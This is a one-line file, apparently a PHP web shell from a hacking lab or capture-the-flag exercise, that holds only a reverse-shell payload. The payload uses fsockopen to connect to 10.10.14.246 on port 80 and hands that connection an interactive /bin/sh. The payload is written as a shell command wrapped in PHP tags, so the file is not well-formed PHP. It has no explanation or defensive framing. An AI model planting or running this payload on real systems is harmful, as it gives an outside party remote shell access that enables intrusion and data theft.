<?php
php -r '$sock=fsockopen("10.10.14.246",80);exec("/bin/sh -i <&3 >&3 2>&3");'
?>
